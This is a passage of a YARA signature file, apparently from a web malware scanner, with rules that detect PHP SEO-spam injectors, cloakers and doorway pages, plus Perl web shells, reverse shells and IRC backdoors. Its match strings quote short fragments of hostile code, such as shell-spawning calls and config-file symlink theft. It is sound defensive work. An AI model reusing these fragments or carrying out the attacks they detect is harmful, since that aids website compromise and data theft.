        $trigger = "<meta HTTP-Equiv=\"refresh\" content=\"0; URL=<?"
    condition:
        $trigger
}

private rule PR06811 : trigger
{
    strings:
        $ps0 = "if (strstr($old, 'RewriteRule"
    condition:
        $ps0
}

rule php_spamseo_redirect_gen_007 : spamseo
{
    strings:
        $trigger = "/go.php?sid="
    condition:
        $trigger and PR06811
}

rule php_spamseo_redirect_gen_018 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=refresh content='0; url=\".$url.\" '>\";exit()"
    condition:
        $trigger
}

private rule PR06812 : trigger
{
    strings:
        $ps0 = "preg_match (\"/(google|ask|yahoo|youtube|wikipedia"
    condition:
        $ps0
}

private rule PR06813 : trigger
{
    strings:
        $ps0 = "echo \"<script type='text/javascript'>setTimeout(\\\"window.location='\" ."
    condition:
        $ps0
}

rule php_spamseo_redirect_gen_019 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06812 and PR00070 and PR06813
}

private rule PR06814 : trigger
{
    strings:
        $ps0 = ";}function redirect($url){echo \"<script type='text/javascript' src='$url/static/main.js'></script>\";return;}"
    condition:
        $ps0
}

rule php_spamseo_redirect_gen_020 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01330 and PR06814
}

private rule PR06815 : trigger
{
    strings:
        $ps0 = "header (\"Location: http"
    condition:
        $ps0
}

rule php_spamseo_redirect_wl_con_001 : spamseo
{
    strings:
        $trigger = "&c=wl_con"
    condition:
        $trigger and PR06815
}

private rule PR06816 : trigger
{
    strings:
        $ps0 = "if(!allowOnly(array("
    condition:
        $ps0
}

private rule PR06817 : trigger
{
    strings:
        $ps0 = "; url=http://youjizz.com"
    condition:
        $ps0
}

rule php_spamseo_redrect_youjizz_001 : spamseo
{
    strings:
        $trigger = "<meta"
    condition:
        $trigger and PR06816 and PR06817
}

rule php_spamseo_related_injector_001 : spamseo
{
    strings:
        $trigger = "echo '<div id=\"Related\">"
    condition:
        $trigger and PR04816
}

rule php_spamseo_remote_cloaker_001 : spamseo
{
    strings:
        $trigger = "$response = @file_get_contents($remote_cloaker"
    condition:
        $trigger and PR00431
}

rule php_spamseo_remote_dor_contnet_001 : spamseo
{
    strings:
        $trigger = "$dor_content=get_content2($dor_way);"
    condition:
        $trigger
}

private rule PR06818 : trigger
{
    strings:
        $ps0 = "$files_to_write"
    condition:
        $ps0
}

private rule PR06819 : trigger
{
    strings:
        $ps0 = "$cont .= 'function get_content2"
    condition:
        $ps0
}

rule php_spamseo_remote_dor_contnet_001_02 : spamseo
{
    strings:
        $trigger = "($dor_way);"
    condition:
        $trigger and PR06818 and PR06819
}

rule php_spamseo_replicas_001 : spamseo
{
    strings:
        $trigger = "1140696640@qq.com"
    condition:
        $trigger
}

private rule PR06820 : trigger
{
    strings:
        $ps0 = "$arrIdUrl = array(\"0\"=>"
    condition:
        $ps0
}

rule php_spamseo_replicas_002 : spamseo
{
    strings:
        $trigger = "-adidas-"
    condition:
        $trigger and PR06820
}

rule php_spamseo_replicas_003 : spamseo
{
    strings:
        $trigger = "include 'check_is_bot.php';if(empty($is_bot)){echo"
    condition:
        $trigger
}

rule php_spamseo_require_wp_content_001 : spamseo
{
    strings:
        $trigger = "require('./wp-content/uploads/ad.php')"
    condition:
        $trigger
}

private rule PR06821 : trigger
{
    strings:
        $ps0 = "scandir(sys_get_temp_dir("
    condition:
        $ps0
}

rule php_spamseo_rewriter_002 : spamseo
{
    strings:
        $trigger = "@unlink"
    condition:
        $trigger and PR06821 and PR01458 and PR04864
}

// MANUAL FIX NECESSARY
private rule PR06822 : trigger
{
    strings:
        $ps0 = "fopen(\""
    condition:
        $ps0
}

rule php_spamseo_rewriter_002_02 : spamseo
{
    strings:
        $trigger = "Rewrite"
        $php_spamseo_rewriter_002_02_r0 = /fopen\s*\((\"|')[(\$dir\/\.)]+htaccess(\"|')\s*,\s*(\"|')w(\"|')\s*\)\s*;/
    condition:
        $trigger and PR00203 and PR02708 and PR06822 and $php_spamseo_rewriter_002_02_r0
}

private rule PR06823 : trigger
{
    strings:
        $ps0 = "fopen(\"../../wp-login.php\", \"r\""
    condition:
        $ps0
}

rule php_spamseo_rewriter_002_03 : spamseo
{
    strings:
        $trigger = "exec(\\'unzip"
    condition:
        $trigger and PR06823 and PR00203
}

private rule PR06824 : trigger
{
    strings:
        $ps0 = "$popup_files[$i] = trim($v[1]);"
    condition:
        $ps0
}

rule php_spamseo_rough_popup_001 : spamseo
{
    strings:
        $trigger = "if(!preg_match(\"/google"
    condition:
        $trigger and PR00092 and PR06824
}

rule php_spamseo_SEoDOR_001 : spamseo
{
    strings:
        $trigger = "User-Agent: SEoDOR-Client ("
    condition:
        $trigger
}

rule php_spamseo_seodor_biz_001 : spamseo
{
    strings:
        $trigger = "substr($_SERVER['REQUEST_URI'], strlen($pathToDor));"
    condition:
        $trigger and PR01401
}

rule php_spamseo_serverjump_001 : spamseo
{
    strings:
        $trigger = "header('Location: http://www.serverjump.com"
    condition:
        $trigger
}

private rule PR06825 : trigger
{
    strings:
        $ps0 = "SESSION_ID1"
    condition:
        $ps0
}

rule php_spamseo_session_id1_001 : spamseo
{
    strings:
        $trigger = "exit('<script>document.location.href = "
    condition:
        $trigger and PR06825
}

rule php_spamseo_setlinks_ru_003_02 : spamseo
{
    strings:
        $trigger = "mysql_query(\"replace into sl_cache values"
    condition:
        $trigger and PR03207
}

private rule PR06826 : trigger
{
    strings:
        $ps0 = "showHide"
    condition:
        $ps0
}

rule php_spamseo_showHide_001 : spamseo
{
    strings:
        $trigger = "echo file_get_contents("
    condition:
        $trigger and PR00050 and PR06826
}

private rule PR06827 : trigger
{
    strings:
        $ps0 = "function isspider()"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_001 : spamseo
{
    strings:
        $trigger = "<sitemapindex"
    condition:
        $trigger and PR06827 and PR01401
}

private rule PR06828 : trigger
{
    strings:
        $ps0 = "!preg_match(\"/\\/$/si\","
    condition:
        $ps0
}

private rule PR06829 : trigger
{
    strings:
        $ps0 = "$map_index = \"{$dir}sitemap_index.xml"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_002 : spamseo
{
    strings:
        $trigger = "sprintf($"
    condition:
        $trigger and PR00507 and PR06828 and PR06829
}

private rule PR06830 : trigger
{
    strings:
        $ps0 = "$request_url=isset($_GET['url'])?$_GET['url']:'';"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_003 : spamseo
{
    strings:
        $trigger = "sitemaps.org"
    condition:
        $trigger and PR06830
}

private rule PR06831 : trigger
{
    strings:
        $ps0 = "@set_time_limit"
    condition:
        $ps0
}

private rule PR06832 : trigger
{
    strings:
        $ps0 = "@ignore_user_abort(1);"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_004 : spamseo
{
    strings:
        $trigger = "smuri"
    condition:
        $trigger and PR00091 and PR06831 and PR06832
}

rule php_spamseo_sitemap_doorway_004_02 : spamseo
{
    strings:
        $trigger = "smuri"
    condition:
        $trigger and PR00091 and PR01392
}

private rule PR06833 : trigger
{
    strings:
        $ps0 = "$add_content, $smstr)){"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_004_03 : spamseo
{
    strings:
        $trigger = "smuri"
    condition:
        $trigger and PR00091 and PR06833
}

private rule PR06834 : trigger
{
    strings:
        $ps0 = "echo @file_get_contents($"
    condition:
        $ps0
}

private rule PR06835 : trigger
{
    strings:
        $ps0 = "getcontent404page"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_004_04 : spamseo
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR05954 and PR00355 and PR06834 and PR06835
}

rule php_spamseo_sitemap_doorway_004_05 : spamseo
{
    strings:
        $trigger = "smuri"
    condition:
        $trigger and PR00091 and PR02181
}

private rule PR06836 : trigger
{
    strings:
        $ps0 = "httpbin"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_005 : spamseo
{
    strings:
        $trigger = "sprintf(\"<loc>%s</loc>"
    condition:
        $trigger and PR02163 and PR06836 and PR00431 and PR05471 and PR00070
}

private rule PR06837 : trigger
{
    strings:
        $ps0 = "pTt7U9vIk19FONpIygrZhoQkYEFSgWyoX"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_007 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR06837 and PR00029
}

private rule PR06838 : trigger
{
    strings:
        $ps0 = "QHNldF90aW1lX2xpbWl0KDM2MDApOw0KQGl"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_008 : spamseo
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR06838 and PR00029
}

rule php_spamseo_sitemap_doorway_009 : spamseo
{
    strings:
        $trigger = ")<1&&function_exists('file_get_contents')){"
    condition:
        $trigger and PR02163 and PR04033 and PR00431 and PR05471
}

private rule PR06839 : trigger
{
    strings:
        $ps0 = "$index_url = \"http://$go_domain/index.php?dom=%s&uri=%s&"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_010 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06839 and PR01021 and PR01569 and PR01431
}

private rule PR06840 : trigger
{
    strings:
        $ps0 = "file_get_contents('/chroot"
    condition:
        $ps0
}

private rule PR06841 : trigger
{
    strings:
        $ps0 = "mb_convert_encoding($"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_012 : spamseo
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR06840 and PR00608 and PR00246 and PR06841
}

rule php_spamseo_sitemap_doorway_012_02 : spamseo
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR06840 and PR00608 and PR00246 and PR03134
}

private rule PR06842 : trigger
{
    strings:
        $ps0 = "$pingRes = getCurl"
    condition:
        $ps0
}

private rule PR06843 : trigger
{
    strings:
        $ps0 = "(strpos($pingRes"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_013 : spamseo
{
    strings:
        $trigger = "base64_encode(@$_SERVER["
    condition:
        $trigger and PR02163 and PR00431 and PR00070 and PR05471 and PR06842 and PR06843
}

rule php_spamseo_sitemap_doorway_013_02 : spamseo
{
    strings:
        $trigger = "base64_encode(@$_SERVER["
    condition:
        $trigger and PR02163 and PR00431 and PR00070 and PR05471 and PR01392 and PR06843
}

private rule PR06844 : trigger
{
    strings:
        $ps0 = "xx($url)"
    condition:
        $ps0
}

private rule PR06845 : trigger
{
    strings:
        $ps0 = "base64_encode(@$_SERVER["
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_013_03 : spamseo
{
    strings:
        $trigger = "$domain = $pf"
    condition:
        $trigger and PR02163 and PR06844 and PR00431 and PR00070 and PR05471 and PR06845
}

private rule PR06846 : trigger
{
    strings:
        $ps0 = "UAZfVRMKAB9RWkVWRUlRIkhWLiFEWh"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_014 : spamseo
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR06846
}

rule php_spamseo_sitemap_doorway_015 : spamseo
{
    strings:
        $trigger = "ZmZkYpLCRGRkZmZmYoJGZGRmZGRiwwLCRGRmZmZkYpKSkpOw"
    condition:
        $trigger and PR01350
}

private rule PR06847 : trigger
{
    strings:
        $ps0 = "@json_decode(trim(curl_exec($"
    condition:
        $ps0
}

private rule PR06848 : trigger
{
    strings:
        $ps0 = "HTTP_CF_CONNECTING_IP"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_016 : spamseo
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR02163 and PR00431 and PR06847 and PR00070 and PR06848
}

private rule PR06849 : trigger
{
    strings:
        $ps0 = "preg_match(\"/sitemap\\.xml"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_017 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR01428 and PR06849 and PR01021
}

private rule PR06850 : trigger
{
    strings:
        $ps0 = "$configs = getContent($apiurl"
    condition:
        $ps0
}

private rule PR06851 : trigger
{
    strings:
        $ps0 = "$protocol.$host"
    condition:
        $ps0
}

rule php_spamseo_sitemap_doorway_018 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06850 and PR01021 and PR01569 and PR06851 and PR01431
}

rule php_spamseo_SoakSoak_001 : spamseo
{
    strings:
        $trigger = "add_action('wp_enqueue_scripts', 'FuncQueueObject');"
    condition:
        $trigger
}

rule php_spamseo_SoakSoak_002 : spamseo
{
    strings:
        $trigger = "add_action('wp_enqueue_scripts', 'Func11');"
    condition:
        $trigger
}

private rule PR06852 : trigger
{
    strings:
        $ps0 = "$f = dirname(__file__) . \"/footer.php\";"
    condition:
        $ps0
}

rule php_spamseo_spamlinkcheck_001 : spamseo
{
    strings:
        $trigger = "function wp_initialize_the_theme_load()"
    condition:
        $trigger and PR06852 and PR00091
}

rule php_spamseo_static_link_provider_001 : spamseo
{
    strings:
        $trigger = "$links=$linkProvider->getLinks($_SERVER['REQUEST_URI'],"
    condition:
        $trigger
}

private rule PR06853 : trigger
{
    strings:
        $ps0 = "class StaticLinkProvider{"
    condition:
        $ps0
}

rule php_spamseo_static_link_provider_002 : spamseo
{
    strings:
        $trigger = "function getLinks($key, $count, $separator='|'){"
    condition:
        $trigger and PR00732 and PR06853
}

rule php_spamseo_streamset_mysql_001 : spamseo
{
    strings:
        $trigger = "define ('streamset', tempnam"
    condition:
        $trigger and PR02534
}

rule php_spamseo_stylesshets_com_001 : spamseo
{
    strings:
        $trigger = "@move_uploaded_file(#userfile_tmp, #abod);"
    condition:
        $trigger
}

rule php_spamseo_stylesshets_com_002 : spamseo
{
    strings:
        $trigger = "touch($htaccess, mktime(12, 17, 11, 12, 31, 2013));"
    condition:
        $trigger
}

rule php_spamseo_stylesshets_com_003 : spamseo
{
    strings:
        $trigger = "if(strpos($m[2],\"http://\") !== 0 && strpos($m[2],\"https://\") !== 0 && strpos($m[2],\"//\") !== 0 ){"
    condition:
        $trigger
}

rule php_spamseo_stylesshets_com_004 : spamseo
{
    strings:
        $trigger = "unset($_GET[$puids_array[$puid_name]]);"
    condition:
        $trigger
}

rule php_spamseo_stylesshets_com_005 : spamseo
{
    strings:
        $trigger = "include \"./wp-admin/headers"
    condition:
        $trigger
}

rule php_spamseo_tdsredirect_001 : spamseo
{
    strings:
        $trigger = "<table border=\"0\"><tr><td>TDS</td><td><input type=\"text\" name=\"ptds\" value=\""
    condition:
        $trigger and PR00092
}

private rule PR06854 : trigger
{
    strings:
        $ps0 = "<n uers=\"uggc:"
    condition:
        $ps0
}

rule php_spamseo_theme_link_spam_001 : spamseo
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR06854
}

private rule PR06855 : trigger
{
    strings:
        $ps0 = "shapgvba purpx_urnqre(){vs(!(shapgvba_rkvfgf"
    condition:
        $ps0
}

rule php_spamseo_theme_link_spam_002 : spamseo
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR06855
}

rule php_spamseo_theme_link_spam_003 : spamseo
{
    strings:
        $trigger = "<a href=\"<?php echo esc_url( __( 'http://www.wpfree.ru/"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_spamseo_theme_link_spam_004 : spamseo
{
    strings:
        $trigger = "\\x7"
        $php_spamseo_theme_link_spam_004_r0 = /if[\s]*\([\s]*![\s]*function_exists\([^)]+\)\)[\s]*\{[\s]*function [\w]+\(\$content\)/
        $php_spamseo_theme_link_spam_004_r1 = /if[\s]*\([\s]*![\s]*function_exists\([^)]+\)\)[\s]*\{[\s]*function[\s]*[\w]+\(\$content\)[\s]*\{[\s]*if[\s]*\(is_user_logged_in\(\)\)\{/
    condition:
        $trigger and $php_spamseo_theme_link_spam_004_r0 and $php_spamseo_theme_link_spam_004_r1
}

rule php_spamseo_theme_link_spam_004_02 : spamseo
{
    strings:
        $trigger = "\\x70\\157\\x73\\151\\164\\x69\\x6f\\x6e\\72\\141\\x62\\x73\\x6f\\154\\165\\164\\145"
    condition:
        $trigger
}

rule php_spamseo_theme_link_spam_005 : spamseo
{
    strings:
        $trigger = "\\74\\x64\\x69\\x76\\x20\\x73\\164\\x79\\x6c\\145\\75\\x22\\x70\\157\\163\\x69\\164\\151\\x6f\\156\\x3a\\x61\\142\\x73\\157\\x6c\\x75\\164\\x65\\73\\164\\x6f\\x70\\72"
    condition:
        $trigger and PR02092
}

private rule PR06856 : trigger
{
    strings:
        $ps0 = "$ksite = !empty"
    condition:
        $ps0
}

private rule PR06857 : trigger
{
    strings:
        $ps0 = "$tiaourl ="
    condition:
        $ps0
}

rule php_spamseo_tiaourl_doorway_002 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR06856 and PR06857
}

rule php_spamseo_tiaourl_doorway_003 : spamseo
{
    strings:
        $trigger = "$tiaourl = file_get_contents(\"http:"
    condition:
        $trigger and PR00113
}

private rule PR06858 : trigger
{
    strings:
        $ps0 = "function get_url"
    condition:
        $ps0
}

private rule PR06859 : trigger
{
    strings:
        $ps0 = "@strtolower($_SERVER"
    condition:
        $ps0
}

rule php_spamseo_tiaourl_doorway_004 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR06858 and PR06859 and PR06857
}

private rule PR06860 : trigger
{
    strings:
        $ps0 = "function get_url1($con_s)"
    condition:
        $ps0
}

rule php_spamseo_tiaourl_doorway_004_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR01428 and PR06860 and PR01021
}

// MANUAL FIX NECESSARY
private rule PR06861 : trigger
{
    strings:
        $ps0 = "function get_url_con($con"
    condition:
        $ps0
}

rule php_spamseo_tiaourl_doorway_005 : spamseo
{
    strings:
        $trigger = "file_get_contents"
        $php_spamseo_tiaourl_doorway_005_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*strtolower\(\$_SERVER\[.HTTP_REFERER.\]\);[\s]*if[\s]*\(strpos/
    condition:
        $trigger and PR00113 and PR06861 and PR06857 and $php_spamseo_tiaourl_doorway_005_r0
}

private rule PR06862 : trigger
{
    strings:
        $ps0 = "global $searchsite,"
    condition:
        $ps0
}

rule php_spamseo_tiaourl_doorway_006 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR06862 and PR06857
}

rule php_spamseo_tiaourl_doorway_007 : spamseo
{
    strings:
        $trigger = "file_put_contents($_SERVER['DOCUMENT_ROOT'].\"/sitemap.xml\""
    condition:
        $trigger and PR00113 and PR01428 and PR01021 and PR01431
}

private rule PR06863 : trigger
{
    strings:
        $ps0 = "eNrtWmtTG0my/SuMw7HYMY6de"
    condition:
        $ps0
}

rule php_spamseo_unicode_vars_001 : spamseo
{
    strings:
        $trigger = "#!/usr/bin/php -q"
    condition:
        $trigger and PR06863 and PR00029
}

private rule PR06864 : trigger
{
    strings:
        $ps0 = "eNrtWWtPW1cW/SsERTVo"
    condition:
        $ps0
}

rule php_spamseo_unicode_vars_002 : spamseo
{
    strings:
        $trigger = "#!/usr/bin/php -q"
    condition:
        $trigger and PR00029 and PR06864
}

private rule PR06865 : trigger
{
    strings:
        $ps0 = "eNrtWetSU1kafRWkrA7UUO"
    condition:
        $ps0
}

rule php_spamseo_unicode_vars_003 : spamseo
{
    strings:
        $trigger = "#!/usr/bin/php -q"
    condition:
        $trigger and PR00029 and PR06865
}

private rule PR06866 : trigger
{
    strings:
        $ps0 = "$String^$Gamma"
    condition:
        $ps0
}

rule php_spamseo_uno_decoder_001 : spamseo
{
    strings:
        $trigger = "function Uno_"
    condition:
        $trigger and PR00732 and PR06866
}

private rule PR06867 : trigger
{
    strings:
        $ps0 = "=\"aHR0cDovL3d3dy5"
    condition:
        $ps0
}

private rule PR06868 : trigger
{
    strings:
        $ps0 = "?password=systemseo"
    condition:
        $ps0
}

rule php_spamseo_urlfilelist_001 : spamseo
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR06867 and PR06868
}

private rule PR06869 : trigger
{
    strings:
        $ps0 = "veribot()"
    condition:
        $ps0
}

rule php_spamseo_veribot_001_001 : spamseo
{
    strings:
        $trigger = "if (veribot"
    condition:
        $trigger and PR06869
}

rule php_spamseo_veribot_001_002 : spamseo
{
    strings:
        $trigger = "function veribot()"
    condition:
        $trigger
}

rule php_spamseo_viaWorm_001 : spamseo
{
    strings:
        $trigger = "_content = str_replace('position:fixed !important; left:-9999px !important;', '', $__"
    condition:
        $trigger
}

rule php_spamseo_viaWorm_002 : spamseo
{
    strings:
        $trigger = "class viaWorm"
    condition:
        $trigger and PR01398
}

private rule PR06870 : trigger
{
    strings:
        $ps0 = "$worm->hideWormFiles();"
    condition:
        $ps0
}

rule php_spamseo_viaWorm_infector_001 : spamseo
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR06870
}

rule php_spamseo_visitor_tracker_001 : spamseo
{
    strings:
        $trigger = "visitorTracker*/@ob_start();@ini_set(\"display_errors\",0);"
    condition:
        $trigger and PR01877 and PR01479
}

private rule PR06871 : trigger
{
    strings:
        $ps0 = "$SETTS = unserialize(@file_get_contents(SETTINGS_FILE"
    condition:
        $ps0
}

private rule PR06872 : trigger
{
    strings:
        $ps0 = "function show_bad_js(){"
    condition:
        $ps0
}

rule php_spamseo_visitor_tracker_001_02 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06871 and PR01479 and PR06872
}

private rule PR06873 : trigger
{
    strings:
        $ps0 = "<!--visitorTracker--><?php @ob_start();@ini_set(\"display_errors\",0);"
    condition:
        $ps0
}

rule php_spamseo_visitor_tracker_001_03 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01877 and PR06873
}

rule php_spamseo_visitor_tracker_001_04 : spamseo
{
    strings:
        $trigger = "<!--visitorTracker--><?php ?><!--visitorTracker-->"
    condition:
        $trigger and PR00323
}

private rule PR06874 : trigger
{
    strings:
        $ps0 = "#post-"
    condition:
        $ps0
}

rule php_spamseo_wordpress_hide_001 : spamseo
{
    strings:
        $trigger = "->user_login !="
    condition:
        $trigger and PR06874 and PR02092 and PR03134
}

private rule PR06875 : trigger
{
    strings:
        $ps0 = "require_once( 'wp-core.php"
    condition:
        $ps0
}

rule php_spamseo_wpcore_001 : spamseo
{
    strings:
        $trigger = "file_exists"
    condition:
        $trigger and PR06875
}

rule php_spamseo_wpcore_002 : spamseo
{
    strings:
        $trigger = "Check('wp-login.php', \"'antibot_ajax"
    condition:
        $trigger
}

private rule PR06876 : trigger
{
    strings:
        $ps0 = "if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] =="
    condition:
        $ps0
}

rule php_spamseo_wp_cd_001 : spamseo
{
    strings:
        $trigger = "if (preg_match('!<div id=\"wp_cd_code\">(.*?)<"
    condition:
        $trigger and PR06876
}

rule php_spamseo_wp_cd_002 : spamseo
{
    strings:
        $trigger = "$install_code = str_replace('{$PASSWORD}' , $install_hash, base64_decode( $install_code ));"
    condition:
        $trigger and PR00732
}

rule php_spamseo_wp_cd_003 : spamseo
{
    strings:
        $trigger = "'/wp-cd.php')"
    condition:
        $trigger and PR01458
}

rule php_spamseo_xcalendar_001 : spamseo
{
    strings:
        $trigger = "xcalendar.php"
    condition:
        $trigger and PR03207
}

rule php_spamseo_xrenoder_001 : spamseo
{
    strings:
        $trigger = "if (strpos(\"@!#%xrenoder^&*()\""
    condition:
        $trigger and PR00265
}

rule php_spamseo_zym_decrypt_001 : spamseo
{
    strings:
        $trigger = "['zym_decrypt']"
    condition:
        $trigger and PR01479
}

private rule PR06877 : trigger
{
    strings:
        $ps0 = "print \"Asmodeus Perl Remote Shell"
    condition:
        $ps0
}

rule pl_backdoor_Asmodeus_001 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06877
}

rule pl_backdoor_cgitelnetshell_001 : backdoor
{
    strings:
        $trigger = "CGI-Telnet"
    condition:
        $trigger
}

rule pl_backdoor_cgitelnetshell_002 : backdoor
{
    strings:
        $trigger = "exec $SHELL || die print CONN"
    condition:
        $trigger
}

private rule PR06878 : trigger
{
    strings:
        $ps0 = ">CGI Shell</b> Connected"
    condition:
        $ps0
}

rule pl_backdoor_cgitelnetshell_003 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06878
}

private rule PR06879 : trigger
{
    strings:
        $ps0 = "print \"<code>Connection closed by foreign host.<br><br></code>\";"
    condition:
        $ps0
}

rule pl_backdoor_cgitelnetshell_004 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06879
}

rule pl_backdoor_conf_steal_001 : backdoor
{
    strings:
        $trigger = "symlink('/home/'.$user.'/public_html/configuration.php"
    condition:
        $trigger
}

rule pl_backdoor_connectback_001 : backdoor
{
    strings:
        $trigger = "Back Backdoor"
    condition:
        $trigger
}

private rule PR06880 : trigger
{
    strings:
        $ps0 = "print \"[*] Spawning Shell \\n"
    condition:
        $ps0
}

rule pl_backdoor_connectback_003 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR06880
}

private rule PR06881 : trigger
{
    strings:
        $ps0 = "shell_exec(\"unzip"
    condition:
        $ps0
}

private rule PR06882 : trigger
{
    strings:
        $ps0 = "proc_open(\"unzip"
    condition:
        $ps0
}

rule pl_backdoor_generic_001 : backdoor
{
    strings:
        $trigger = "system(\"unzip"
    condition:
        $trigger and PR06881 and PR06882
}

private rule PR06883 : trigger
{
    strings:
        $ps0 = "system($shell);"
    condition:
        $ps0
}

private rule PR06884 : trigger
{
    strings:
        $ps0 = "!/usr/bin/perl"
    condition:
        $ps0
}

rule pl_backdoor_generic_002 : backdoor
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06883 and PR06884
}

private rule PR06885 : trigger
{
    strings:
        $ps0 = "print \"IHS BACK-CONNECT BACKDOOR  \\n\\n\";"
    condition:
        $ps0
}

rule pl_backdoor_IHS_001 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06885
}

rule pl_backdoor_priv8_001 : backdoor
{
    strings:
        $trigger = "<title>priv8 cgi shell</title>"
    condition:
        $trigger
}

rule pl_backdoor_reverse_shell_001 : backdoor
{
    strings:
        $trigger = "system('/bin/sh -i');"
    condition:
        $trigger
}

rule pl_backdoor_revsliderexpoit_001 : backdoor
{
    strings:
        $trigger = "Revslider/Showbiz shell upload exploit"
    condition:
        $trigger
}

rule pl_backdoor_revsliderexpoit_001_001 : backdoor
{
    strings:
        $trigger = "my $shell = \"wp-content/plugins/$plugin/temp/update_extract/$plugin/cmd.php\";"
    condition:
        $trigger
}

private rule PR06886 : trigger
{
    strings:
        $ps0 = "my $cmd3 = encode_base64(\"uname -n\");"
    condition:
        $ps0
}

rule pl_backdoor_revsliderexpoit_001_002 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR06886
}

rule pl_backdoor_satanicsocks_001 : backdoor
{
    strings:
        $trigger = "Satanic Socks Server"
    condition:
        $trigger and PR06884
}

private rule PR06887 : trigger
{
    strings:
        $ps0 = "notice(\"$pn\", \"\\001VERSION"
    condition:
        $ps0
}

private rule PR06888 : trigger
{
    strings:
        $ps0 = "sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada\");"
    condition:
        $ps0
}

rule pl_backdoor_shellbot_002 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06887 and PR06888
}

private rule PR06889 : trigger
{
    strings:
        $ps0 = "&xml_start($path,$bug,$dork,\"GooGLeCA,GooGLeDE,GooGLeUK"
    condition:
        $ps0
}

rule pl_backdoor_shellbot_003 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06889
}

private rule PR06890 : trigger
{
    strings:
        $ps0 = "system(decode_base64($"
    condition:
        $ps0
}

rule pl_backdoor_system_base64_001 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06890
}

rule pl_backdoor_webr00t_001 : backdoor
{
    strings:
        $trigger = "webr00t cgi shell"
    condition:
        $trigger
}

private rule PR06891 : trigger
{
    strings:
        $ps0 = "# cmd.pl: Run commands on a webserver"
    condition:
        $ps0
}

rule pl_backdoor_webshell_001 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06891
}

rule pl_backdoor_webshell_002 : backdoor
{
    strings:
        $trigger = "=\"/usr/sbin/apache2 -k start\";# <-- shell in ps aux"
    condition:
        $trigger
}

rule pl_backdoor_webshell_003 : backdoor
{
    strings:
        $trigger = "prepare(\"SHOW DATABASES\");$sth->execute;print \"<b>DATABASES:</b>"
    condition:
        $trigger
}

private rule PR06892 : trigger
{
    strings:
        $ps0 = "''=~('(?{'.('vKY18Fv"
    condition:
        $ps0
}

rule pl_backdoor_webshell_004 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06892
}

rule pl_backdoor_webshell_005 : backdoor
{
    strings:
        $trigger = "print \"httpflood from irc\\n\";"
    condition:
        $trigger
}

private rule PR06893 : trigger
{
    strings:
        $ps0 = "$login = crypt($WebShell::Configuration::password, $salt);"
    condition:
        $ps0
}

rule pl_backdoor_webshell_006 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06893
}

private rule PR06894 : trigger
{
    strings:
        $ps0 = "DLCCyber Perl Shell"
    condition:
        $ps0
}

rule pl_backdoor_webshell_007 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06894
}

private rule PR06895 : trigger
{
